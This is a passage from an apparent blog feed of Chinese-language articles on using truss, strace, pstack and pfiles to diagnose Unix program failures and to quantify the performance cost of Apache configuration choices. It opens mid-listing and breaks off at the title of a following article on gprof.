            = 0<br>getcontext(0x080475D0)<br>getrlimit(RLIMIT_STACK, 0x080475C8)             = 0<br>getpid()                                        = 15691 [15690]<br>lwp_private(0, 1, 0xFEE22A00)                   = 0x000001C3<br>setustack(0xFEE22A60)<br>sysi86(SI86FPSTART, 0xFEF879BC, 0x0000133F, 0x00001F80) = 0x00000001<br>ioctl(1, TCGETA, 0x08046C20)                    = 0<br>fstat64(1, 0x08046B80)                          = 0<br>You have been alive 10654 days<br>write(1, “ Y o u   h a v e   b e e”.., 31)      = 31<br>You were born on 24/1/1980 which is a Thursday<br>write(1, “ Y o u   w e r e   b o r”.., 47)      = 47<br>_exit(134511508)  </p><p>清单 4 给出 Linux 上 strace 的输出。</p><p><strong>清单 4. strace 的输出</strong>  </p><p>$ strace ./ageindays 24/1/1980 26/3/2009<br>execve(“./ageindays”, [“./ageindays”, “24/1/1980”, “26/3/2009”],<br>[/* 50 vars */]) = 0<br>brk(0)                                  = 0x602000<br>mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)<br>    = 0x7f47db185000<br>mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)<br>    = 0x7f47db184000<br>access(“/etc/ld.so.preload”, R_OK)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/lib/tls/x86_64/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/lib/tls/x86_64”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/lib/tls/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/lib/tls”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/lib/x86_64/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/lib/x86_64”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/lib/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/lib”, {st_mode=S_IFDIR|0755, st_size=53248, …}) = 0<br>open(“/usr/local/lib/tls/x86_64/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/local/lib/tls/x86_64”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/local/lib/tls/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/local/lib/tls”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/local/lib/x86_64/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/local/lib/x86_64”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/local/lib/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/local/lib”, {st_mode=S_IFDIR|0755, st_size=4096, …}) = 0<br>open(“/usr/local/qt/lib/tls/x86_64/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/local/qt/lib/tls/x86_64”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/local/qt/lib/tls/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/local/qt/lib/tls”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/local/qt/lib/x86_64/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/local/qt/lib/x86_64”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/local/qt/lib/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/local/qt/lib”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/X11R6/lib/tls/x86_64/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/X11R6/lib/tls/x86_64”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/X11R6/lib/tls/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/X11R6/lib/tls”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/X11R6/lib/x86_64/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/X11R6/lib/x86_64”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/usr/X11R6/lib/libc.so.6”, O_RDONLY)<br>    = -1 ENOENT (No such file or directory)<br>stat(“/usr/X11R6/lib”, 0x7fffe31858f0)<br>    = -1 ENOENT (No such file or directory)<br>open(“/etc/ld.so.cache”, O_RDONLY)      = 3<br>fstat(3, {st_mode=S_IFREG|0644, st_size=85050, …}) = 0<br>mmap(NULL, 85050, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f47db16f000<br>close(3)                                = 0<br>open(“/lib/libc.so.6”, O_RDONLY)        = 3<br>read(3, “177ELF211?????????3?&gt;1???3003451?????@”…,<br>    832) = 832<br>fstat(3, {st_mode=S_IFREG|0755, st_size=1330352, …}) = 0<br>mmap(NULL, 3437208, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0)<br>    = 0x7f47dac24000<br>mprotect(0x7f47dad63000, 2093056, PROT_NONE) = 0<br>mmap(0x7f47daf62000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE,<br>    3, 0x13e000) = 0x7f47daf62000<br>mmap(0x7f47daf67000, 17048, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,<br>   -1, 0) = 0x7f47daf67000<br>clo<br>se(3)                                = 0<br>mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)<br>    = 0x7f47db16e000<br>mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)<br>    = 0x7f47db16d000<br>arch_prctl(ARCH_SET_FS, 0x7f47db16d6f0) = 0<br>mprotect(0x7f47daf62000, 16384, PROT_READ) = 0<br>mprotect(0x600000, 4096, PROT_READ)     = 0<br>mprotect(0x7f47db186000, 4096, PROT_READ) = 0<br>munmap(0x7f47db16f000, 85050)           = 0<br>fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), …}) = 0<br>mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)<br>    = 0x7f47db183000<br>write(1, “You have been alive 10654 days<br>“…, 31You have been alive 10654 days<br>) = 31<br>write(1, “You were born on 24/1/1980 which “…, 47You were born on 24/1/1980<br>   which is a Thursday<br>) = 47<br>exit_group(0)    </p><p>在这两个输出中，每个输出行对应于应用程序执行的一个函数调用，其中显示函数的参数和函数调用的返回值。与调试示例不同，列出的每个函数调用都是系统或系统库中的函数，因此表示调用的函数的更低层接口。例如，在应用程序中可能使用 C 或 C++ 中的 de&lt;fpopen()de&lt; 函数打开文件，但是这个函数实际上是更低层的 de&lt;open()de&lt; 函数的包装器。</p><p>了解应用程序正在执行的操作并不需要了解每个函数的情况。输出中的许多行与操作系统为装载和执行程序所做的初始化相关。这两个跟踪输出的基本结构是相同的：</p><ul><li>调用 de&lt;execve()de&lt; 函数以启动一个新程序。</li><li>装载程序所需的库。在 Solaris 输出中，首先使用 de&lt;resolvepath()de&lt; 寻找库，然后使用 de&lt;open()de&lt; 打开库。对于 Linux，使用 de&lt;stat()de&lt; 检查库是否存在，然后使用 de&lt;open()de&lt; 打开它。</li><li>为进程保留和分配一些内存。其中一部分内存是为应用程序保留的堆栈空间，一部分用来保存程序，其他内存保存程序使用的变量。</li><li>最后，执行程序，调用 de&lt;write()de&lt; 函数输出年龄和生日信息。</li></ul><p>如果执行跟踪并希望了解每个步骤的具体情况，可以使用 man 命令访问每个函数的手册页。</p><p>识别应用程序启动问题</p><p>在启动应用程序时的一个典型问题是，程序无法正确地初始化，但是在终止时给出一个不完整或导致误解的消息。对应用程序运行跟踪常常可以揭示这个问题的根源。例如，清单 5 显示一个测试应用程序运行失败了。</p><p><strong>清单 5. 应用程序失败</strong>  </p><p>$ ./errnoacc<br>ERROR: Application failed to initialize  </p><p>错误消息并没有提供关于应用程序为什么会启动失败的具体信息。在这里，问题是故意引入的，但是您使用的任何命令或应用程序都可能出现相同的问题，而错误消息没什么帮助，有时候甚至没有错误消息。</p><p>对应用程序运行跟踪可能会提供一些线索（见清单 6）。</p><p><strong>清单 6. 运行跟踪</strong>  </p><p>$ truss ./errnoacc<br>execve(“errnoacc”, 0x08047B20, 0x08047B28)  argc = 1<br>mmap(0x00000000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0)<br>    = 0xFEFB0000<br>resolvepath(“/usr/lib/ld.so.1”, “/lib/ld.so.1”, 1023) = 12<br>getcwd(“/export/home/mc”, 1014)                 = 0<br>resolvepath(“/export/home/mc/errnoacc”, “/export/home/mc/errnoacc”, 1023) = 24<br>xstat(2, “/export/home/mc/errnoacc”, 0x080477E4) = 0<br>open(“/var/ld/ld.config”, O_RDONLY)             = 3<br>fxstat(2, 3, 0x080476C4)                        = 0<br>mmap(0x00000000, 144, PROT_READ, MAP_SHARED, 3, 0) = 0xFEFA0000<br>close(3)                                        = 0<br>sysconfig(_CONFIG_PAGESIZE)                     = 4096<br>xstat(2, “/usr/lib/libc.so.1”, 0x08046F04)      = 0<br>resolvepath(“/usr/lib/libc.so.1”, “/lib/libc.so.1”, 1023) = 14<br>open(“/usr/lib/libc.so.1”, O_RDONLY)            = 3<br>mmap(0x00010000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_ALIGN, 3, 0) = 0xFEF90000<br>mmap(0x00010000, 1413120, PROT_NONE, MAP_PRIVATE|MAP_NORESERVE|MAP_ANON|MAP_ALIGN,<br>    -1, 0) = 0xFEE30000<br>mmap(0xFEE30000, 1302809, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_TEXT, 3, 0)<br>    = 0xFEE30000<br>mmap(0xFEF7F000, 30862, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|<br>    MAP_INITDATA, 3, 1306624) = 0xFEF7F000<br>mmap(0xFEF87000, 4776, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANON,<br>    -1, 0) = 0xFEF87000<br>munmap(0xFEF6F000, 65536)                       = 0<br>memcntl(0xFEE30000, 187632, MC_ADVISE, MADV_WILLNEED, 0, 0) = 0<br>close(3)                                        = 0<br>mmap(0x00010000, 24576, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON|MAP_ALIGN,<br>    -1, 0) = 0xFEE20000<br>munmap(0xFEF90000, 32768)                       = 0<br>getcontext(0x08047534)<br>getrlimit(RLIMIT_STACK, 0x0804752C)             = 0<br>getpid()                                        = 15727 [15726]<br>lwp_private(0, 1, 0xFEE22A00)                   = 0x000001C3<br>setustack(0xFEE22A60)<br>sysi86(SI86FPSTART, 0xFEF879BC, 0x0000133F, 0x00001F80) = 0x00000001<br>open(“/etc/shadow”, O_RDONLY)                   Err#13 EACCES [file_dac_read]<br>ioctl(1, TCGETA, 0x08046BB0)                    = 0<br>fstat64(1, 0x08046B10)                          = 0<br>ERROR: Application failed to initialize<br>write(1, “ E R R O R :   A p p l i”.., 40)      = 40<br>_exit(0)  </p><p>问题出现在这一行上：de&lt;open(“/etc/shadow”, O_RDONLY) Err#13 EACCES [file_dac_read]de&lt;。</p><p>在这里，应用程序试图打开一个文件，但是因为有文件权限保护这个文件，运行应用程序的用户没有访问权。因为无法打开这个文件，应用程序终止并在进程中写错误消息。</p><p>跟踪正在运行的应用程序</p><p>希望跟踪应用程序常常是因为应用程序已经启动，而您希望查明应用程序为什么不工作了。与初始化示例一样，应用程序提供的错误消息或其他信息常常没有准确地指出问题。</p><p>试图锁定或访问另一个进程正在使用的资源会使应用程序看起来冻结了，没有响应。</p><p>strace 和 truss 都能够 “连接” 到正在运行的进程。连接到进程的跟踪与从命令行运行进程的跟踪相似，也产生程序正在执行的系统函数的列表。实际的跟踪从跟踪启动时执行的函数开始；对于在执行期间 “挂起” 的程序，跟踪应该会显示程序正在等待的函数。</p><p>要想跟踪正在运行的程序，需要指定要跟踪的进程的进程 ID (PID)。例如，在清单 6 中，跟踪的程序已经停止，但是没有报告错误。这里使用 ps 工具列出正在运行的进程（见清单 7）。</p><p><strong>清单 7. 使用 ps 工具列出正在运行的进程</strong>  </p><p>$ ps -ef|grep errlock<br>      mc 15779 15747   0 18:26:59 pts/2       0:00 ./errlock<br>      mc 15742   680   0 18:26:36 pts/3       0:00 ./errlock<br>      mc 15817 15784   0 18:28:44 pts/4       0:00 grep errlock<br>      mc 15734   680   0 18:25:00 pts/3       0:01 /usr/bin/emacs-nox errlock.c<br>$ truss -p 15779<br>fcntl(3, F_SETLKW, 0x08047AC4)  (sleeping…)  </p><p>在输出中可以看到，已经调用了 de&lt;fcntl()de&lt; 函数，它要在一个文件上设置锁。在这里，这个函数会一直等待到成功地设置锁，然后才继续运行。不幸的是，另一个进程已经锁住了这个文件，所以第二个应用程序必须等待第一个应用程序使用完文件并释放锁。</p><p>对 于这种情况，truss 有点儿局限性：它无法指出要锁住哪个文件，也无法指出当前锁住了哪个文件，从而阻碍了第二个程序的执行。这是因为跟踪过程是在已经调用了打开文件的函数之 后启动的。truss 和 strace 只跟踪在它们执行期间调用的函数；它们无法查明已经调用的函数。</p><p>获取堆栈跟踪</p><p>可以看出，truss 对于监视整个程序很有用，但是对于监视已经启动的程序可能有点儿局限性。如果使用基于 SVR4 的 UNIX，比如 Solaris 或 AIX，那么 pstack 命令可能有帮助。</p><p>pstack 命令实际上属于一组进程检查命令，这些命令输出正在运行的进程的相关信息。其他工具包括 pfiles（输出进程使用的文件的列表）和 psig（显示信号和信号处理函数的列表）。</p><p>在使用这些命令时，需要指定进程的 PID。pstack 命令输出一个正在运行的进程的调用堆栈，显示在进程到达当前函数之前调用的函数。例如，对正在等待被锁住的文件的进程使用 pstack，会产生清单 8 中的输出。</p><p><strong>清单 8. 对正在等待被锁住的文件的进程使用 pstack</strong>  </p><p>$ pstack 15828<br>15828:  ./errlock<br> feef0877 fcntl    (3, 7, 8047ac4)<br> feedcd49 fcntl    (3, 7, 8047ac4, 8050e74) + 91<br> 08050f10 main     (1, 8047b24, 8047b2c) + d8<br> 08050cdc _start   (1, 8047c08, 0, 8047c12, 8047c7d, 8047c8e) + 80  </p><p>在这里，它没有提供我们需要的信息。现在试试 pfiles（见清单 9）。</p><p><strong>清单 9. 使用 pfiles</strong>  </p><p>$ pfiles 15856<br>15856:  ./errlock<br>  Current rlimit: 256 file descriptors<br>   0: S_IFCHR mode:0620 dev:292,0 ino:989038936 uid:101 gid:7 rdev:24,3<br>      O_RDWR|O_NOCTTY|O_LARGEFILE<br>      /dev/pts/3<br>   1: S_IFCHR mode:0620 dev:292,0 ino:989038936 uid:101 gid:7 rdev:24,3<br>      O_RDWR|O_NOCTTY|O_LARGEFILE<br>      /dev/pts/3<br>   2: S_IFCHR mode:0620 dev:292,0 ino:989038936 uid:101 gid:7 rdev:24,3<br>      O_RDWR|O_NOCTTY|O_LARGEFILE<br>      /dev/pts/3<br>   3: S_IFREG mode:0666 dev:182,65545 ino:198 uid:101 gid:10 size:0<br>      O_RDWR<br>      advisory write lock set by process 15828<br>      /export/home/mc/lockdemo  </p><p>这些输出就比较有用了。可以看到进程已经打开的文件称为 lockdemo ，因为 truss 显示正在等待文件锁，所以可能是这个文件导致了问题。</p><p>truss 和 strace 都是被动的跟踪。可以查看正在执行的函数，但是无法了解关于正在发生的情况的详细信息，也无法更有针对性地指定要跟踪的东西和跟踪时要输出的信息。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>应用程序跟踪对性能改变进行量化分析</title>
      <link href="/2009/12/22/application-tracking-makes-quantitative-analysis-of-performance-changes/"/>
      <url>/2009/12/22/application-tracking-makes-quantitative-analysis-of-performance-changes/</url>
      <content type="html"><![CDATA[<p>使用 Apache Web 服务器作为示例，以了解如何分析公共配置的性能含义。使用应用程序跟踪来观察应用程序运行过程中进行的系统调用。通过统计调用的次数和发生的时间，您可以轻松地了解性能改变的影响。</p><p>您 可以对应用程序进行跟踪，以找出它们暂停或不运行的原因。并且可以使用同样的方法，了解更多关于应用程序的信息并理解某些配置的性能含义。因为 Apache 非常流行并且大多数读者对它都比较熟悉，所以本文使用 Apache 作为示例。Apache 所进行的每次系统调用都会对 Web 页面的提供带来延迟，通过跟踪不同配置下的 Web 服务器，您可以确定具体配置的影响。</p><p>应用程序跟踪概述</p><p>在应用程序的执行 过程中，当需要打开文件、发送数据包或者使用系统资源时，它会对基础操作系统进行相应的系统调用。跟踪应用程序意味着可以 在调用发生时观察到这些系统调用，这将使得您能够深入地了解该应用程序的行为。在 Solaris 和 IBM AIX? 操作系统 (AIX) 中，使用 truss 命令完成这项任务，而在 Linux? 中则使用 strace。清单 1 显示了对 pwd 命令进行跟踪的示例。</p><p>清单 1. 跟踪 pwd 命令</p><p>-bash-3.00$ truss pwd … getcwd(“/export/home/sean”, 1025) = 0 /export/home/sean write(1, “ / e x p o r t / h o m e”.., 18) = 18 _exit(0)</p><p>在删除开始处与加载该应用程序相关的输出内容后，您可以看到所进行的三次系统调用：</p><p>getcwd 返回当前工作目录。输出内容中显示了字符串“/export/home/sean”返回到缓冲区。</p><p>write 可以显示给定的字符串。因为在其执行之后才显示这个系统调用，所以先输出了它的执行结果。还可以注意到，write 系统调用的结果是写入字符的个数数目，在这个示例中为 17 加上一个回车。</p><p>_exit 使用错误代码 0 退出该程序，这个错误代码通常表示成功结束。</p><p>尽管这是一个很简单的示例，但它演示了通过应用程序跟踪可以观察程序内部机制的程度。有关跟踪方面更深入的信息，请参见参考资料部分。</p><p>Apache 配置的简要介绍</p><p>可以通过一个名为 httpd.conf 的文件对 Apache Web 服务器进行配置。清单 2 显示了一个简单配置中的部分内容。</p><p>清单 2. 示例 httpd.conf</p><p>DocumentRoot “/var/apache/htdocs” Options FollowSymLinks AllowOverride None Options Indexes FollowSymLinks MultiViews</p><p>第一行定义了在何处可以找到 HTML 文件。将所有的请求都映射到这个目录。如果请求 /project/charter.html，将使用 /var/apache/htdocs/project/charter.html 提供该页面。httpd.conf 中剩余的部分由两个 Directory 节组成。 和 之间的任何内容都将应用于指定目录及其所有的子目录。在本例中，第一节将两项设置应用于根目录，而第二节则指向 /var/apache/htdocs。</p><p>如果多个节应用于单个请求，那么将会对这些命令进行组合，并且最适合的目录具有高优先级。例如，将 使用 /var/apache/htdocs/project/charter.html 提供 /project/charter.html 请求的页面。/var/apache/htdocs 是 / 的子目录，所以 Options Indexes FollowSymLinks MultiViews 来自第二节，AllowOverride None 来自第一节。</p><p>可以对许多内容进行配置，并且每项内容都具有其性能含义。本文余下的内容重点关注于如何对这些改变的影响进行量化分析。</p><p>建立基准</p><p>在您进行任何调整之前，务必要了解系统当前的运行方式。使用 -X 参数启动 Apache，这个参数将强制 Apache 进入单进程调试模式。这样做可以确保将请求发送到正在进行跟踪的进程，并且消除常规进程间通信所带来的开销。</p><p>在 守护进程启动之后，通过运行 ps -ef 找到相应的进程 ID，并查找 httpd 守护进程。在找到该进程之后，使用 truss -c -p PID 附加到该进程。-c 选项表示对系统调用进行计数，而不是逐个显示它们，而 -p 则表示将跟踪器附加于一个正在运行的进程。</p><p>使用 Web 浏览器请求文档。在页面加载之后，回到 truss 应用程序，然后按 Ctrl-C 以结束计数。对于静态 HTML 页面，您应该看到如清单 3 所示的内容（为使这些数字变得更有趣，本示例进行了 100 次相同的请求）。</p><p>清单 3. 系统调用基准</p><p>sunbox# truss -c -p 15026 (make the Web request 100 times) ^C syscall seconds calls errors read .009 200 write .020 200 close .020 200 time .004 300 alarm .018 1100 fcntl .009 300 sigaction .007 400 munmap .007 100 llseek .001 100 pollsys .005 100 mmap64 .008 100 stat64 .007 100 open64 .006 100 accept .019 100 getsockname .002 100 setsockopt .002 100 ——– —— —- sys totals: .149 3600 0 usr time: .120 elapsed: 8.960</p><p>truss 返回系统调用的列表、执行调用耗费的总时间、调用的次数和任何发现的问题。在这个报表的结尾处，返回了这些系统调用耗费的总时间，以及执行应用程序所耗费 的时间。对于这些目的来说，所耗时间是没有意义的，因为它指的是从启动 truss 开始到其结束的时间，而与 Web 请求没有任何关系。</p><p>清 单 3 显示了最简单的情况。在来自 Web 浏览器的连接请求到达后，accept 系统调用完成该连接。Web 服务器使用 read 调用获得请求的内容，将请求的内容映射到磁盘上的文件。Web 服务器首先使用 stat64 验证该文件是否存在，使用 open64 打开该文件以便进行读取，然后使用 mmap64 将该文件的内容映射到内存中。然后使用 write 将这个文件发送回客户端，使用另一个 write 生成日志文件，并且服务器执行来自浏览器的最后一个 read。该列表中其余的调用都是系统开销，并且当配置发生改变时，不会有显著的变化。</p><p>解释这些数值</p><p>100 次请求总共耗费 0.269 秒 (0.149 + 0.120)，这样的性能相当不错，并且该服务器每秒钟应该可以提供大约 370 个页面 (100/0.269)。但是不能完全相信这些数值，因为它们仅表示进程耗费在 CPU 上的时间，而不是其真正的执行时间（也称为时钟时间）。还有更多的因素需要考虑，如磁盘和网络的速度、计算机上正运行的其他内容、该守护进程运行于调试模 式的事实。您还需要考虑系统调用跟踪本身的开销。</p><p>本文中使用的方法重点关注这些操作的相对计时和使用应用程序跟踪消除浪费掉的操作。如果您需要了解 Web 服务器每秒可以提供的页面数目，参考资料部分中有相应的软件链接，它可以帮助您确定该数值。</p><p>跟踪 AllowOverride 范围</p><p>Apache 允许管理员通过 .htaccess 机制将配置权委托给个别的用户。.htaccess 是一个包含附加配置指令的文件，如果在 httpd.conf 中通过 AllowOverride 配置了请求的目录，那么 Web 服务器将搜索这个文件。清单 4 显示了前面的配置了 AllowOverride Limit 的配置信息，它允许用户获取访问 Web 页面的用户名和密码。</p><p>清单 4. 配置了 AllowOverride 的示例 httpd.conf</p><p>DocumentRoot “/var/apache/htdocs” Options FollowSymLinks AllowOverride Limit Options Indexes FollowSymLinks MultiViews</p><p>重新启动 httpd 守护进程并再次运行这些测试，其结果如清单 5 所示。</p><p>清单 5. 开启了 AllowOverride Limit 的 100 次请求的结果</p><p>sunbox# truss -c -t write,read,open64,stat64,mmap64 -p 21136 ^C syscall seconds calls errors read .012 200 write .021 200 mmap64 .007 100 stat64 .007 100 open64 .022 500 400 ——– —— —- sys totals: .072 1100 400 usr time: .141 elapsed: 16.660</p><p>初看起来，系统调用耗费的时间下降了，但这是因为使用了 -t 选项将跟踪任务限制于一些有意义的系统调用。大多数系统调用并没有发生变化，但现在有 500 次 open64 调用，其中有 400 次返回了错误。执行 open64 的时间增加了（从 0.006 秒增加到 0.22 秒），同时用户空间部分的时间也增加了（从 0.12 秒增加到 0.141 秒）。</p><p>时间增加是因为 Apache 现在必须完成附加的工作以处理该请求，即使没有配置重写。单独的 AllowOverride Limit 配置明显地增加了开销。问题依然存在，即什么导致了这些错误？ 要回答这个问题，可以跟踪单个 Web 请求，如清单 6 所示。</p><p>清单 6. 确定 open64 调用失败的原因</p><p>sunbox# truss -t open64 -p 21136 open64(“/.htaccess”, O_RDONLY) Err#2 ENOENT open64(“/var/.htaccess”, O_RDONLY) Err#2 ENOENT open64(“/var/apache/.htaccess”, O_RDONLY) Err#2 ENOENT open64(“/var/apache/htdocs/.htaccess”, O_RDONLY) Err#2 ENOENT open64(“/var/apache/htdocs/test.html”, O_RDONLY) = 5</p><p>清单 6 显示了当请求进入时，Apache 对每个指向 /var/apache/htdocs 的目录进行检查并尝试打开 .htaccess 文件，但是因为 AllowOverride 配置为根目录，所以这个文件并不存在。Apache 必须在每个子目录中查找 .htaccess 文件的重写信息，并对它们进行处理。这样一来，由于额外的系统调用、更多的用户空间开销和额外的磁盘活动，从而进一步增加了延迟。对于 100 次请求来说，增加零点几秒的时间看起来并不是很明显，但是对于一台繁忙的服务器，就会增加更长的延迟。</p><p>既然您了解了重写的范围，那么理想的 解决方案是不允许重写，并且强制在 httpd.conf 中对所有的内容进行配置。如果失败，可以将配置的范围限制于需要它的目录。在这个研究示例中，把 AllowOverride Limit 放到第二个 Directory 节中，这将仅添加一个额外的 open64 调用，以便在 /var/apache/htdocs 中查找 .htaccess。对所有的父目录进行搜索是浪费时间，因为在这个配置中，不会使用其中的任何文件来提供页面。</p><p>研究主机名查找</p><p>当 Web 服务器接收到一个请求时，它所知道的关于客户端的信息只有其 IP 地址，如 129.42.42.212 对应于 IBM.com。然而，Web 服务器并不知道这个地址来自于 IBM.com，因此，它必须进行反向 DNS 查找。这样做需要耗费一定的时间，如果在发送请求之前需要这个名称，那么将会延迟对客户端的响应。过去，Apache 在缺省情况下会执行这些反向查找，但现在这种行为已经有了改变。</p><p>还有另一种情况，其中必须进行反向 DNS 搜索。当基于主机名（而不是 IP 地址）配置访问限制时，Apache 必须首先将 IP 地址反向解析为相应的主机名，然后再次将主机名解析为 IP 地址，以确保它们正确匹配。因为反向域名搜索可以由地址块所有者确定，所以要防止 IP 欺骗的发生，必须进行第二次查找。可以通过应用程序跟踪来确定 DNS 解析的影响吗？</p><p>要对其进行测试，可以从前面的示例中删除 AllowOverride Limit，然后添加 Allow from ibm.com 代替缺省的 Allow from all。然后，对 DNS 服务器进行更改以便向您的工作站返回 something.ibm.com，确保初始反向检查能够成功并且随后的正向查找必须通过 Internet 完成。在示例运行过程中，对保护的 Web 服务器的请求耗费了 15 秒的时间。相反，使用 IP 地址代替 ibm.com 所耗费的时间小于半秒钟。清单 7 显示了在使用 DNS 确保安全时，对一些系统调用进行统计。</p><p>清单 7. 通过主机名进行限制的 Web 请求的 truss 输出</p><p>bash-3.00# truss -c -p 26089 ^C syscall seconds calls errors read .000 5 write .000 3 open .000 2 close .001 10 time .000 3 stat .000 5 alarm .000 8 fcntl .000 7 2 sigaction .000 3 sysconfig .000 5 pollsys .001 5 door_info .000 2 stat64 .000 1 open64 .000 2 so_socket .001 5 accept .000 1 connect .002 5 recvfrom .000 2 send .001 5 getsockname .000 1 setsockopt .000 1 ——– —— —- sys totals: .011 81 2 usr time: .004</p><p>truss 报告了该进程所耗费的时间远远小于客户端感觉到的时间（0.015 秒与 15 秒）。这是因为大多数套接字操作都是异步地 进行的，其中套接字进行轮询以检查数据是否出现，而不是使得应用程序处于阻塞（等待）状态以等待响应。如此一来，应用程序在等待结果的时候不会消耗 CPU 时间。这就解释了 truss 报告的时间和客户端感觉到的时间之间出现差异的原因。</p><p>truss 并没有忘记所做的更改，0.015 秒比本文中研究的第一个简单示例要高一个数量级。从系统调用计数中可以看出，有一些以前没有出现过的调用，包括 read、write、close 和 stat。以及还有 send、connect、so_socket 和 pollsys，这些系统调用用于进行名称请求。因为名称解析可以来自于不同的来源，包括本地文件系统和名称缓存守护进程，所以必须对这几个位置进行检 查。在随后的调用中，请求时间小于 1 秒，这是因为对 DNS 信息进行了缓存。</p><p>最后，大部分的延迟来自于远程名称服务器和正向解析。这 个事实进一步强调了，如果您希望依赖于名称查找，那么就需要使用 DNS 缓存和快速 DNS 服务器。然而，最佳的解决方案是使用一种可选的方法来处理这个问题。一种比较简单的解决方案是指定 IP 地址块（如 Allow from 10.0.0.0/8），这种方法比 DNS 查找要快得多。因为反向和正向查找必须匹配，所以对名称进行的操作，很可能可以用于网段。另外，Apache 可以集成各种身份验证系统，所以基于用户的身份验证是另一种可选方法。</p><p>系统调用与库调用</p><p>如果熟悉套接字编程，那么您可能会寻 找 gethostbyname 和其他类似的调用，这些调用都可以用来执行主机查找功能。有一些库调用，由 /usr/lib 中的系统库 libc 和 libsocket 提供。库调用封装了一个或多个系统调用，以及额外的逻辑。您可以将它们作为程序员友好的接口来进行系统调用。例如，gethostbyname 库调用将执行许多步骤，以便根据服务器的配置查找相应的名称，如检查 /etc/hosts 或搜索网络信息系统 (NIS) 或 DNS。这些步骤包含了内核所提供的更小的构件，即系统调用。在大多数这样的这种情况下，两者之间的差别通常很小。truss 还可以跟踪库调用，但是无法提供像系统调用那样详细的信息。</p><p>结束语</p><p>监视和统计系统调用的功能不仅有助于进行故障排除，还有助 于理解应用程序配置如何对性能产生影响。与系统的其他部分之间的每个交互操作都会 调用一个或多个系统调用，并且每次调用都会增加系统开销。这并不是说系统调用非常糟糕，如果程序员不与其他的部分进行交互，那将是很乏味的。相反，在改变 应用程序时，您可以监视系统调用的使用，以便更好地了解这些改变对总体性能的影响。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>程序分析工具gprof介绍</title>
      <link href="/2009/12/22/program-analysis-tool-gprof/"/>
      <url>/2009/12/22/program-analysis-tool-gprof/</url>
